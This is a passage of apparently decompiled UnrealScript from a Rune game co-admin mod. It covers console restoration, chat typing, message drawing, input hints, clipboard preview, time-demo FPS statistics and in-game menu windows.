	}

	// Backup current state to RConsole
	RConsole.TypedStr = TypedStr;
	RConsole.ConsoleWindow = ConsoleWindow;
	RConsole.Root = Root;

	// Reset look and feel
	Root.LookAndFeel = none;
	RConsole.Root.LookAndFeel = new (none) Class'RMenu.RuneLookAndFeel';

	// Recreate status bar
	RuneRootWindow(Root).StatusBar = none;
	RuneRootWindow(Root).StatusBar = RuneMenuStatusBar(Root.CreateWindow(Class'RMenu.RuneMenuStatusBar', 0.0, 460.0, 640.0, 20.0));
	RuneRootWindow(Root).StatusBar.ShowWindow();

	// Set console reference
	RConsole.Root.Console = RConsole;
	RConsole.bTyping = bTyping;

	// Ensure typing state if there's typed text
	if (TypedStr != "")
	{
		RConsole.bTyping = true;
	}

	// Check and disable macrotexture if set
	if (Caps(Owner.ConsoleCommand("get texture macrotexture")) != "NONE")
	{
		Owner.ConsoleCommand("set texture macrotexture none");
	}

	// Hide and close CAZ menu components
	zRuneMenu(UNK_v6297).HideSubmenusExcept(none);
	zRuneMenu(UNK_v6297).HideWindow();
	zRuneMenu(UNK_v6297).Close();
	UNK_v6297 = none;

	// Show original game menu
	GameMenu.ShowWindow();

	// Restore various console states
	RConsole.bCreatedRoot = bCreatedRoot;
	RConsole.MouseX = MouseX;
	RConsole.MouseY = MouseY;
	RConsole.bUWindowType = bUWindowType;
	RConsole.bUWindowActive = bUWindowActive;
	RConsole.bLocked = bLocked;
	RConsole.bQuickKeyEnable = bQuickKeyEnable;
	RConsole.ShowDesktop = ShowDesktop;
	RConsole.bTimeDemo = bTimeDemo;
	RConsole.bSaveTimeDemoToFile = bSaveTimeDemoToFile;
	RConsole.HistoryCur = HistoryCur;
	RConsole.HistoryBot = HistoryBot;
	RConsole.HistoryTop = HistoryTop;

	// Copy history array
	for (Index = 0; Index < 16; Index++)
	{
		RConsole.History[Index] = History[Index];
	}

	// Set console state based on current mode
	switch (INT_v6715)
	{
		case 1:
			RConsole.GotoState('UWindow');
			break;
		case 2:
			RConsole.GotoState('Typing');
			break;
		default:
			RConsole.GotoState('None');
			break;
	}

	// Update console window title with date
	RConsole.ConsoleWindow.WindowTitle = "Rune Console " $ string(Viewport.Actor.Level.Day) $ "." $ string(Viewport.Actor.Level.Month) $ "." $ string(Viewport.Actor.Level.Year);

	// Clear CAZ console reference
	ZRunePlayer(Viewport.Actor).NewZConsole = none;

	// Hide console if no typed text
	if (TypedStr == "")
	{
		zRConsoleW.Close();
		HideConsole();
	}

	// Log restoration
	LogInternal("CAZ ##1");

	// Switch back to original console
	Viewport.Console = RConsole;
	return;
}

exec function Type()
{
	// Clear typed string and reset cursor position
	TypedStr = "";
	INT_v6678 = Len(TypedStr);

	// Toggle typing mode
	if (INT_v6715 == 2)
	{
		INT_v6715 = 0;
		bTyping = false;
		Viewport.Actor.Typing(bTyping);
		ConsoleDest = 0.0;
		return;
	}

	// Enter typing mode
	INT_v6715 = 2;
	bTyping = true;
	Viewport.Actor.Typing(bTyping);
	return;
}

exec function Talk()
{
    TypedStr = "Say ";
    INT_v6678 = Len(TypedStr);
    bNoStuff = true;
    INT_v6715 = 2;
    bTyping = true;
    Viewport.Actor.Typing(bTyping);
    return;
}

exec function TeamTalk()
{
    TypedStr = "TeamSay ";
    INT_v6678 = Len(TypedStr);
    bNoStuff = true;
    INT_v6715 = 2;
    bTyping = true;
    Viewport.Actor.Typing(bTyping);
    return;
}

exec function ViewUp()
{
    BorderSize = Clamp(BorderSize - 1, 0, 12);
    return;
}

exec function ViewDown()
{
    BorderSize = Clamp(BorderSize + 1, 0, 12);
    return;
}
// Suggested name: DisplayConsoleWindow
function ShowConsole()
{
	// Enable console visibility and set the console mode to UWindow interface
	bShowConsole = true;
	INT_v6715 = 1;
	
	// If new console mode is enabled, create and show the custom console window
	if (newConsole > 0)
	{
		// Create the custom console window if it doesn't exist
		if (zRConsoleW == none)
		{
			zRConsoleW = zRuneConsoleWindow(Root.CreateWindow(Class'coadminz7.zRuneConsoleWindow', 10.0000000, 10.0000000, 300.0000000, 190.0000000));
			zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.List = UWindowConsoleClientWindow(ConsoleWindow.ClientArea).TextArea.List;
		}
		
		// Show the custom console window if the root is created
		if (bCreatedRoot)
		{
			zRConsoleW.ShowWindow();
		}
		
		// Set the window title with date and server address
		zRConsoleW.WindowTitle = ((("CAZConsole | " $ (FormatCurrentDate("."))) $ " | [") $ Viewport.Actor.Level.GetAddressURL()) $ "] ";        
	}
	else
	{
		// Show the standard console window if the root is created
		if (bCreatedRoot)
		{
			ConsoleWindow.ShowWindow();
		}
		
		// Set the window title with date and server address
		ConsoleWindow.WindowTitle = ((("CAZConsole_ | " $ (FormatCurrentDate("."))) $ " | [") $ Viewport.Actor.Level.GetAddressURL()) $ "] ";
	}
	return;
}

// Suggested name: HideConsoleWindow
function HideConsole()
{
	// Reset console lines, disable console visibility
	ConsoleLines = 0;
	bShowConsole = false;
	
	// Close UWindow if quick key is enabled
	if (bQuickKeyEnable)
	{
		CloseUWindow();
	}
	
	// Hide the appropriate console window based on console mode
	if (newConsole > 0)
	{
		if (zRConsoleW != none)
		{
			zRConsoleW.HideWindow();
		}        
	}
	else
	{
		if (ConsoleWindow != none)
		{
			ConsoleWindow.HideWindow();
		}
	}
	
	// Close UWindow if no active window is visible
	if ((Root.ActiveWindow == none) || !Root.ActiveWindow.bWindowVisible)
	{
		CloseUWindow();
	}
	return;
}
// Suggested name: DrawConsoleMessages
// This function draws the console messages and the current typed input on the canvas.
// It iterates through the message history, calculates text positions, and renders each message.
simulated function DrawConsoleView(Canvas Canvas)
{
	local int CurrentY; // Current Y position for drawing text
	local int MessageIndex; // Index for iterating through messages
	local int MessageSlot; // Calculated slot in the message array
	local float TextWidth; // Width of the text string
	local float TextHeight; // Height of the text string

	// Initialize Y position based on console lines
	CurrentY = ConsoleLines - 1;
	
	// Set the current typed input as the latest message for display
	MsgText[int(float((TopLine + 1) + 64) % float(64))] = "(>" @ TypedStr;
	
	// Start from the scrollback position
	MessageIndex = Scrollback;
	
	// Loop through the messages to draw them
	while (MessageIndex < (numLines + 1))
	{
		// Calculate the message slot in the circular buffer
		MessageSlot = int(float((TopLine + (64 * 2)) - (MessageIndex - 1)) % float(64));
		
		// Set font for drawing
		Canvas.Font = Canvas.MedFont;
		
		// Calculate text dimensions based on message type
		if ((MsgType[MessageSlot] == 'Say') || MsgType[MessageSlot] == 'TeamSay')
		{
			Canvas.StrLen((MsgPlayer[MessageSlot].PlayerName $ ":") @ MsgText[MessageSlot], TextWidth, TextHeight);
		}
		else
		{
			Canvas.StrLen(MsgText[MessageSlot], TextWidth, TextHeight);
		}
		
		// Ensure minimum height
		if (TextHeight == float(0))
		{
			TextHeight = 5.0000000;
		}
		
		// Update Y position
		CurrentY -= int(TextHeight);
		
		// Stop if the text would be above the visible area
		if ((float(CurrentY) + TextHeight) < float(0))
		{
			break;
		}
		
		// Set drawing position
		Canvas.SetPos(4.0000000, float(CurrentY));
		Canvas.Font = Canvas.MedFont;
		
		// Draw the text based on message type
		if ((MsgType[MessageSlot] == 'Say') || MsgType[MessageSlot] == 'TeamSay')
		{
			Canvas.DrawText((MsgPlayer[MessageSlot].PlayerName $ ":") @ MsgText[MessageSlot], false);
		}
		else
		{
			Canvas.DrawText(MsgText[MessageSlot], false);
		}
		
		// Increment message index
		MessageIndex++;
	}
	
	return;
}

function string GetDelimitedPart(string InputString, int Index, optional string Delimiter)
{
	local string TempString, Parts[40], Substring;
	local int Counter, OccurrenceCount;

	// Ensure delimiter is not empty
	if (Delimiter == "")
	{
		Delimiter = " ";
	}

	// Prepare a doubled string for parsing
	TempString = InputString $ InputString;

	// Count occurrences of the delimiter in the input string
	OccurrenceCount = 0;
	for (Counter = 0; Counter < Len(InputString) + 1; Counter++)
	{
		Substring = Mid(InputString, Counter, Len(Delimiter));
		if (Substring == Delimiter)
		{
			OccurrenceCount++;
		}
	}

	// If delimiter found, split the string into parts
	if (OccurrenceCount > 0)
	{
		for (Counter = 1; Counter < 40; Counter++)
		{
			Parts[Counter] = TrimLeadingSpaces(Left(TempString, InStr(TempString, Delimiter)));
			TempString = Right(TempString, Len(TempString) - Len(Delimiter) - Len(Parts[Counter]));
		}
		return Parts[Index];
	}
	else
	{
		// No delimiter found, return the original string
		return InputString;
	}
}

simulated function DrawSingleView(Canvas Canvas)
{
	local string FormattedTypedString; // The formatted string to display the typed input with cursor
	local int CurrentMessageIndex; // Index for iterating through messages
	local int LoopIndex; // General loop index
	local float TextWidth; // Width of the text for positioning
	local float TextHeight; // Height of the text for positioning
	local string MessagePrefix; // Prefix for the typed message, e.g., "(> "
	local int LineOffset; // Offset for line spacing
	local string MessageText; // The actual message text

	// Reset canvas origin and color for drawing
	Canvas.SetOrigin(0.0, 0.0);
	Canvas.SetColor(255.0, 255.0, 255.0);
	Canvas.bCenter = false;

	// Handle typing input display if not in menu and typing is active
	if (!Viewport.Actor.bShowMenu && bTyping)
	{
		MessagePrefix = "(> ";

		// Manage cursor blinking based on cursor position
		if (INT_v6678 == Len(TypedStr))
		{
			INT_v6679 = 201;
		}
		if (INT_v6678 < Len(TypedStr))
		{
			INT_v6679 += 3;
		}

		// Format the typed string with cursor
		if (INT_v6679 > 200)
		{
			FormattedTypedString = ((MessagePrefix $ Left(TypedStr, INT_v6678)) $ "_") $ Right(TypedStr, Len(TypedStr) - INT_v6678);
		}
		if (INT_v6679 < 200)
		{
			FormattedTypedString = ((MessagePrefix $ Left(TypedStr, INT_v6678)) $ " ") $ Right(TypedStr, Len(TypedStr) - INT_v6678);
		}
		if (INT_v6679 > 400)
		{
			INT_v6679 = 0;
		}

		// Set font based on chat font type
		if (chatFont == 12)
		{
			if (Fnt_v5287 == none)
			{
				Fnt_v5287 = Font(DynamicLoadObject("derp.derp2", Class'Engine.Font'));
			}
			Canvas.Font = Fnt_v5287;
		}
		else
		{
			Canvas.Font = Canvas.MedFont;
		}

		// Draw the formatted typed string
		Canvas.StrLen(FormattedTypedString, TextWidth, TextHeight);
		Canvas.SetPos(2.0000000, ((FrameY - float(ConsoleLines)) - TextHeight) - float(1));
		Canvas.DrawText(FormattedTypedString, false);
	}

	// If HUD is displaying messages, return early
	if ((Viewport.Actor.myHUD != none) && Viewport.Actor.myHUD.DisplayMessages(Canvas))
	{
		return;
	}

	// Draw recent messages if there are any and not in menu or showing scores
	if ((TextLines > 0) && !Viewport.Actor.bShowMenu || Viewport.Actor.bShowScores)
	{
		CurrentMessageIndex = TopLine;
		LoopIndex = 0;

		// Collect up to 4 recent messages
		while ((LoopIndex < 4) && CurrentMessageIndex >= 0)
		{
			if (((MsgText[CurrentMessageIndex] != "") && MsgTick[CurrentMessageIndex] > 0.0000000) && MsgTick[CurrentMessageIndex] > MsgTickTime)
			{
				if (MsgType[CurrentMessageIndex] == 'Say')
				{
					eq_vxv_4273[LoopIndex] = (string(MsgPlayer[CurrentMessageIndex]) $ ":") @ MsgText[CurrentMessageIndex];
				}
				else
				{
					eq_vxv_4273[LoopIndex] = MsgText[CurrentMessageIndex];
				}
				LoopIndex++;
			}
			CurrentMessageIndex--;
		}

		// Draw the collected messages
		CurrentMessageIndex = 0;
		Canvas.Font = Canvas.MedFont;
		LoopIndex = 0;
		LineOffset = 0;

		while (LoopIndex < 4)
		{
			if (eq_vxv_4273[3 - LoopIndex] != "")
			{
				Canvas.SetPos(4.0000000, (2.0000000 + float(10 * CurrentMessageIndex)) + float(10 * LineOffset));
				Canvas.StrLen(eq_vxv_4273[3 - LoopIndex], TextWidth, TextHeight);
				Canvas.DrawText(eq_vxv_4273[3 - LoopIndex], false);
				if (TextHeight == 18.0000000)
				{
					LineOffset++;
				}
				CurrentMessageIndex++;
			}
			LoopIndex++;
		}
	}
	return;
}
// Suggested name: GetClipboardText
function string GetClipboardText()
{
	local string ClipboardText;

	ClipboardText = Owner.PasteFromClipboard();
	if (Len(ClipboardText) > 300)
	{
		return "";
	}
	Owner.ReplaceText(ClipboardText, "\r\n", ">");
	return ClipboardText;
}
function DrawEnhancedChatHints(Canvas Canvas)
{
	local int CurrentX, CurrentY;
	local float TextWidth, TextHeight;
	local string HintMessage, ClipboardText, TruncatedClipboardText;
	local int LineOffset, HorizontalOffset, VerticalOffset;
	local string ClipboardPreview;
	local zPlayerReplicationInfo PlayerRepInfo;

	PlayerRepInfo = zPlayerReplicationInfo(Owner.PlayerReplicationInfo);
	
	// Determine hint message based on current state
	if (STR_v6665 == "cmdlist")
	{
		HintMessage = (((("   -> press " $ cSmartKeyName) $ " to replace with command '") $ STR_v6666) $ "' ") $ STR_v6672;        
	}
	else if (STR_v6667 == "input")
	{
		if ((STR_v6666 != "") && Left(STR_v6666, 21) != "Unrecognized property")
		{
			HintMessage = ("   [INFO:] This key is already bound. (" $ STR_v6666) $ ")";                
		}
		else if (Left(STR_v6666, 21) == "Unrecognized property")
		{
			HintMessage = "   [INFO:] This seems like an invalid key.";                    
		}
		else
		{
			HintMessage = "   [INFO:] This key is unbound.";
		}            
	}
	else if (STR_v6667 == "team")
	{
		HintMessage = "   [INFO:] team RED/BLUE/GREEN/GOLD/PINK or team 0/1/2/3/4";                
	}
	else if (STR_v6665 != "")
	{
		HintMessage = (("   -> press " $ cSmartKeyName) $ " to replace with ") $ STR_v6666;                    
	}
	else if ((STR_v6664 != "") && HintMessage == "")
	{
		HintMessage = ((("   -> " $ STR_v6664) $ "? (press ") $ cSmartKeyName) $ " to replace)");
	}
	
	// Set initial drawing positions
	CurrentX = 108;
	CurrentY = 1057;
	LineOffset = (Len(TypedStr) / 233) * 10;
	HorizontalOffset = int(Canvas.ClipX * 0.0500000);
	TextHeight = TextHeight + float(LineOffset);
	
	// Configure canvas for drawing
	Canvas.SetOrigin(0.0000000, 0.0000000);
	Canvas.DrawColor = MakeColor(byte(255), 0, 0);
	Canvas.Style = 1;
	Canvas.bCenter = false;
	Canvas.Font = Canvas.MedFont;
	Canvas.SetPos(2.0000000 + float(HorizontalOffset), ((FrameY - float(ConsoleLines)) - TextHeight) - float(22));
	Canvas.DrawText(HintMessage);
	Canvas.DrawColor = MakeColor(byte(255), byte(255), byte(255));
	
	// Draw spectator chat info if applicable
	if (PlayerRepInfo.B_v5402 && spec)
	{
		Canvas.DrawColor = MakeColor(byte(255), 50, 50);
		Canvas.SetPos(2.0000000 + float(HorizontalOffset), (((FrameY - float(ConsoleLines)) - TextHeight) - float(VerticalOffset)) - float(41));
		if (PlayerRepInfo.Local_int_v2 > 0)
		{
			if (atEveryone)
			{
				Canvas.DrawTextClipped("    Your chat messages  will be sent to: EVERYONE        -  Press 'ALT' to toggle");                
			}
			else
			{
				Canvas.DrawTextClipped("    Your chat messages  will be sent to: SPECTATORS        -  Press 'ALT' to toggle");
			}            
		}
		else
		{
			Canvas.DrawTextClipped("    Your chat messages  will be sent to spectators only, login as coadmin to send messages to everyone");
		}
		Canvas.DrawColor = MakeColor(byte(255), byte(255), byte(255));
		VerticalOffset += 10;
	}
	
	// Draw summon search results if applicable
	if ((Len(STR_v6671) > 3) && STR_v6665 == "summon")
	{
		Canvas.SetPos(2.0000000 + float(HorizontalOffset), (((FrameY - float(ConsoleLines)) - TextHeight) - float(VerticalOffset)) - float(41));
		Canvas.DrawTextClipped("    Summons matching your search: " $ STR_v6671);
		VerticalOffset += 10;
	}
	
	// Draw command search results if applicable
	if ((Len(STR_v6671) > 3) && STR_v6665 == "cmdlist")
	{
		Canvas.SetPos(2.0000000 + float(HorizontalOffset), (((FrameY - float(ConsoleLines)) - TextHeight) - float(VerticalOffset)) - float(41));
		Canvas.DrawTextClipped("    Commands matching your search: " $ STR_v6671);
		VerticalOffset += 10;
	}
	
	// Draw clipboard paste hint if clipboard has content
	ClipboardText = GetClipboardText();
	if ((ClipboardText != "") && (ClipboardText != " "))
	{
		ClipboardPreview = eqdollar_vxv_1145(12, ClipboardText);
		Canvas.SetPos(2.0000000 + float(HorizontalOffset), (((FrameY - float(ConsoleLines)) - TextHeight) - float(VerticalOffset)) - float(41));
		Canvas.DrawText(("    CTRL+V to paste clipboard [" $ ClipboardPreview) $ "]");
		VerticalOffset += 10;
	}
	
	// Draw undo hint if applicable
	if (STR_v6674 != "")
	{
		Canvas.SetPos(2.0000000 + float(HorizontalOffset), (((FrameY - float(ConsoleLines)) - TextHeight) - float(VerticalOffset)) - float(41));
		Canvas.DrawText("    CTRL+Z to undo last action");
		VerticalOffset += 10;
	}
	
	// Draw copy hints based on context
	if (HintMessage != "")
	{
		Canvas.SetPos(2.0000000 + float(HorizontalOffset), (((FrameY - float(ConsoleLines)) - TextHeight) - float(VerticalOffset)) - float(41));
		if (STR_v6667 == "input")
		{
			Canvas.DrawText("    CTRL+C to copy bind");
			VerticalOffset += 10;            
		}
		else if (Len(STR_v6663) >= 3)
		{
			Canvas.DrawText("    CTRL+C to copy suggestion");
			VerticalOffset += 10;
		}        
	}
	else if (Left(Caps(TypedStr), 4) == "SAY ")
	{
		Canvas.SetPos(2.0000000 + float(HorizontalOffset), (((FrameY - float(ConsoleLines)) - TextHeight) - float(VerticalOffset)) - float(41));
		Canvas.DrawText("    CTRL+C to copy current text");
		VerticalOffset += 10;
	}
	return;
}

// Suggested name: TruncateClipboardText
function string eqdollar_vxv_1145(int MaxLength, string InputText)
{
	local string TrimmedText;

	TrimmedText = TrimLeadingSpaces(InputText);
	Owner.ReplaceText(TrimmedText, Chr(13) $ Chr(10), ">");
	if (Len(TrimmedText) > MaxLength)
	{
		return Left(TrimmedText, MaxLength) $ "...";        
	}
	else
	{
		return TrimmedText;
	}
	return;
}
// Suggested name: ExtractCommandFromString
function string ExtractCommandFromString(string InputString)
{
	local string ReversedString;
	local string FirstWordReversed;

	// Reverse the input string
	ReversedString = ReverseString(InputString);
	// Extract the part up to the first space in the reversed string
	FirstWordReversed = Left(ReversedString, InStr(ReversedString, " "));
	// If the original string has no space, return it as is
	if (InStr(InputString, " ") < 0)
	{
		return InputString;
	}
	else
	{
		// Otherwise, reverse the space plus the extracted part
		return ReverseString(" " $ FirstWordReversed);
	}
}

// Suggested name: CalculateLengthAfterSpaceInReversedString
function int CalculateLengthAfterSpaceInReversedString(string InputString)
{
	local int SpacePosition;
	local string ReversedString;
	local int RemainingLength;

	// Reverse the input string
	ReversedString = ReverseString(InputString);
	// Find the position of the first space in the reversed string
	SpacePosition = InStr(ReversedString, " ");
	// If no space found, return 0
	if (SpacePosition == 0)
	{
		return 0;
	}
	else
	{
		// Calculate the length of the string after the space
		RemainingLength = Len(ReversedString) - SpacePosition;
		return RemainingLength;
	}
}

// Suggested name: ReverseString
function string ReverseString(string InputString)
{
	local string TempString;
	local int Index;
	local string OutputString;

	TempString = InputString;
	// Loop from the end of the string to the beginning, building the reversed string
	for (Index = Len(TempString); Index > 0; Index--)
	{
		OutputString = OutputString $ Mid(TempString, Index, 1);
	}
	return OutputString;
}

exec function TimeDemo(bool b, optional bool b2)
{
    bSaveTimeDemoToFile = b2;

    if(b)
    {
        StartTimeDemo();        
    }
    else
    {
        StopTimeDemo();
    }
    return;
}

function StartTimeDemo()
{
    TimeDemoFont = none;

    if(bTimeDemo)
    {
        return;
    }
    bTimeDemo = true;
    bStartTimeDemo = true;
    return;
}

function StopTimeDemo()
{
    if(!bTimeDemo)
    {
        return;
    }
    bTimeDemo = false;
    PrintTimeDemoResult();
    return;
}
// Suggested name: PrintTimeDemoResult
function PrintTimeDemoResult()
{
	local LevelInfo EntryLevel; // Reference to the entry level for timing calculations
	local float AverageFPS; // Calculated average frames per second
	local float ElapsedTime; // Total elapsed time for the demo
	local string ResultMessage; // Formatted message to display and log
	local string LogContent; // Content to save to file if enabled

	// Get the entry level to access timing information
	EntryLevel = Viewport.Actor.GetEntryLevel();
	
	// Calculate the elapsed time, subtracting any extra time (e.g., pauses)
	ElapsedTime = (EntryLevel.TimeSeconds - StartTime) - ExtraTime;
	
	// Calculate average FPS, avoiding division by zero
	if (ElapsedTime <= 0.0)
	{
		AverageFPS = 0.0;
	}
	else
	{
		AverageFPS = float(FrameCount) / ElapsedTime;
	}
	
	// Format the result message with frame count, time, and FPS stats
	ResultMessage = ((((((((((string(FrameCount) @ FramesText) @ FormatFloat(ElapsedTime)) @ SecondsText) @ MinText) @ FormatFloat(MinFPS)) @ MaxText) @ FormatFloat(MaxFPS)) @ AvgText) @ FormatFloat(AverageFPS)) @ fpsText) $ ".";
	
	// Display the message to the client and log it internally
	Viewport.Actor.ClientMessage(ResultMessage);
	LogInternal(ResultMessage);
	
	// If saving to file is enabled, prepare the log content
	if (bSaveTimeDemoToFile)
	{
		// Construct the file content with average FPS, engine version, and min/max FPS
		LogContent = (((((((((((FormatFloat(AverageFPS) $ " Unreal ") $ Viewport.Actor.Level.EngineVersion) $ "\r\n") $ FormatFloat(MinFPS)) $ " Min") $ "\r\n") $ FormatFloat(MaxFPS)) $ " Max") $ "\r\n";
		SaveTimeDemo(LogContent);
	}
	return;
}
// Suggested name: CalculateTimeDemoMetrics
function TimeDemoCalc()
{
	local LevelInfo EntryLevel; // Reference to the entry level for time calculations
	local float Delta; // Time difference since the last frame

	// Get the entry level for timing references
	EntryLevel = Viewport.Actor.GetEntryLevel();

	// Handle restarting the time demo
	if (bRestartTimeDemo)
	{
		StopTimeDemo();
		StartTimeDemo();
		bRestartTimeDemo = false;
	}

	// Initialize time demo variables when starting
	if (bStartTimeDemo)
	{
		bStartTimeDemo = false;
		StartTime = EntryLevel.TimeSeconds;
		ExtraTime = 0.0;
		LastFrameTime = StartTime;
		LastSecondStartTime = StartTime;
		FrameCount = 0;
		LastSecondFrameCount = 0;
		MinFPS = 0.0;
		MaxFPS = 0.0;
		LastSecFPS = 0.0;
		return;
	}

	// Calculate the time delta since the last frame
	Delta = EntryLevel.TimeSeconds - LastFrameTime;

	// Skip processing if delta is too large (likely due to pause or lag)
	if (Delta > 0.5)
	{
		ExtraTime += Delta;
		LastSecondStartTime = EntryLevel.TimeSeconds;
		LastSecondFrameCount = 0;
		LastFrameTime = EntryLevel.TimeSeconds;
		return;
	}

	// Increment frame counters
	FrameCount++;
	LastSecondFrameCount++;

	// Update FPS metrics every second
	if ((EntryLevel.TimeSeconds - LastSecondStartTime) > 1.0)
	{
		LastSecFPS = float(LastSecondFrameCount) / (EntryLevel.TimeSeconds - LastSecondStartTime);

		// Update minimum FPS if this is the first measurement or lower
		if ((MinFPS == 0.0) || LastSecFPS < MinFPS)
		{
			MinFPS = LastSecFPS;
		}

		// Update maximum FPS
		if (LastSecFPS > MaxFPS)
		{
			MaxFPS = LastSecFPS;
		}

		// Reset counters for the next second
		LastSecondFrameCount = 0;
		LastSecondStartTime = EntryLevel.TimeSeconds;
	}

	// Update the last frame time
	LastFrameTime = EntryLevel.TimeSeconds;
	return;
}
// Suggested name: DrawTextAtPosition
function DrawTextAtPosition(Canvas Canvas, float X, float Y, string Text)
{
	// Set the canvas color to white
	Canvas.SetColor(255.0, 255.0, 255.0);
	// Set the drawing position
	Canvas.SetPos(X, Y);
	// Draw the text
	Canvas.DrawText(Text);
	return;
}

// Suggested name: DrawMouseWindowDebugInfo
function DrawMouseWindowDebugInfo(Canvas Canvas)
{
	local float MouseX, MouseY; // Mouse coordinates relative to the window
	local int Offset; // Offset for positioning the debug box

	// Get the mouse position relative to the mouse window
	Root.MouseWindow.GetMouseXY(MouseX, MouseY);
	// Set the font for drawing text
	Canvas.Font = Font'Engine.MedFont';
	// Define the horizontal offset for the debug box
	Offset = 30;
	// Draw a stretched background box for the debug info
	DrawStretchedBox(Canvas, 0.8, int(((Root.MouseX * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotX)) + float(Offset)), int(((Root.MouseY * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotY)) - 10.0), 420, 142, MakeColor(0, 0, 0));
	// Draw the first line of debug info: window name and coordinates
	DrawTextAtPosition(Canvas, ((Root.MouseX * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotX)) + float(Offset), (Root.MouseY * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotY), ((((((((Root.GetPlayerOwner().GetItemName(string(Root.MouseWindow)) $ " ") $ string(int(Root.MouseX * Root.GUIScale))) $ ", ") $ string(int(Root.MouseY * Root.GUIScale))) $ " (") $ string(int(MouseX))) $ ", ") $ string(int(MouseY))) $ ")");
	// Draw subsequent lines of debug info for window hierarchy
	DrawTextAtPosition(Canvas, ((Root.MouseX * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotX)) + float(Offset), ((Root.MouseY * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotY)) + 30.0, " Parent:      " @ string(Root.MouseWindow.ParentWindow));
	DrawTextAtPosition(Canvas, ((Root.MouseX * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotX)) + float(Offset), ((Root.MouseY * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotY)) + 40.0, " FirstChild:  " @ string(Root.MouseWindow.FirstChildWindow));
	DrawTextAtPosition(Canvas, ((Root.MouseX * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotX)) + float(Offset), ((Root.MouseY * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotY)) + 50.0, " LastChild:   " @ string(Root.MouseWindow.LastChildWindow));
	DrawTextAtPosition(Canvas, ((Root.MouseX * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotX)) + float(Offset), ((Root.MouseY * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotY)) + 60.0, " NextSibling: " @ string(Root.MouseWindow.NextSiblingWindow));
	DrawTextAtPosition(Canvas, ((Root.MouseX * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotX)) + float(Offset), ((Root.MouseY * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotY)) + 70.0, " PrevSibling: " @ string(Root.MouseWindow.PrevSiblingWindow));
	DrawTextAtPosition(Canvas, ((Root.MouseX * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotX)) + float(Offset), ((Root.MouseY * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotY)) + 80.0, " ActiveWindow:" @ string(Root.MouseWindow.ActiveWindow));
	DrawTextAtPosition(Canvas, ((Root.MouseX * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotX)) + float(Offset), ((Root.MouseY * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotY)) + 90.0, " Root:        " @ string(Root.MouseWindow.Root));
	DrawTextAtPosition(Canvas, ((Root.MouseX * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotX)) + float(Offset), ((Root.MouseY * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotY)) + 100.0, " OwnerWindow: " @ string(Root.MouseWindow.OwnerWindow));
	DrawTextAtPosition(Canvas, ((Root.MouseX * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotX)) + float(Offset), ((Root.MouseY * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotY)) + 110.0, " ModalWindow: " @ string(Root.MouseWindow.ModalWindow));
	DrawTextAtPosition(Canvas, ((Root.MouseX * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotX)) + float(Offset), ((Root.MouseY * Root.GUIScale) - float(Root.MouseWindow.Cursor.HotY)) + 120.0, (((" Dimensions: " @ string(Root.MouseWindow.WinLeft)) @ string(Root.MouseWindow.WinTop)) @ string(Root.MouseWindow.WinWidth)) @ string(Root.MouseWindow.WinHeight));
	return;
}
// Suggested name: LaunchUWindowInterface
function LaunchUWindow()
{
	local int LoopIndex; // Loop index for iterating through items if needed

	// Enable typing for the player owner
	Root.GetPlayerOwner().Typing(true);
	
	// Suspend precaching to improve performance during UI interaction
	Viewport.bSuspendPrecaching = true;
	
	// Activate UWindow interface, but not if quick key is enabled
	bUWindowActive = !bQuickKeyEnable;
	
	// Show Windows mouse cursor
	Viewport.bShowWindowsMouse = true;
	
	// Handle quick key mode: do not draw the world
	if (bQuickKeyEnable)
	{
		bNoDrawWorld = false;
	}
	else
	{
		// In standalone mode, pause the game
		if (int(Viewport.Actor.Level.NetMode) == int(NM_Standalone))
		{
			Viewport.Actor.SetPause(true);
		}
		
		// Set no draw world based on desktop visibility
		bNoDrawWorld = ShowDesktop;
	}
	
	// Ensure root window is visible
	if (Root != none)
	{
		Root.bWindowVisible = true;
	}
	
	// If currently typing, disable it
	if (INT_v6715 == 2)
	{
		bTyping = false;
		Viewport.Actor.Typing(bTyping);
	}
	
	// If root exists and not changing levels, play menu sound and create menus
	if ((Root != none) && !bLevelChange)
	{
		Root.LookAndFeel.PlayMenuSound(Root, 14);
		
		// Create the main CAZ menu if it doesn't exist
		if (UNK_v6297 == none)
		{
			UNK_v6297 = Root.CreateWindow(Class'coadminz7.zRuneMenu', 0.0000000, 0.0000000, 200.0000000, 460.0000000);
		}
		
		// Hide the game menu and its submenus
		if (GameMenu != none)
		{
			GameMenu.HideWindow();
			
			if (RuneMenu(GameMenu).OptionsMenu != none)
			{
				RuneMenu(GameMenu).OptionsMenu.HideWindow();
				RuneMenu(GameMenu).OptionsMenu.HideAllWindows();
			}
			
			if (RuneMenu(GameMenu).MultiMenu != none)
			{
				RuneMenu(GameMenu).MultiMenu.HideWindow();
			}
		}
	}
	
	// Set console mode to UWindow
	INT_v6715 = 1;
	
	return;
}

// Suggested name: CloseUWindowInterface
function CloseUWindow()
{
	// If not in quick key mode, unpause the game
	if (!bQuickKeyEnable)
	{
		Viewport.Actor.SetPause(false);
	}
	
	// Stop typing and reset rendering map
	Root.GetPlayerOwner().Typing(false);
	Root.GetPlayerOwner().RendMap = 5;
	
	// Disable world drawing and UI states
	bNoDrawWorld = false;
	bQuickKeyEnable = false;
	bUWindowActive = false;
	Viewport.bShowWindowsMouse = false;
	
	// Hide the root window if it exists
	if (Root != none)
	{
		Root.bWindowVisible = false;
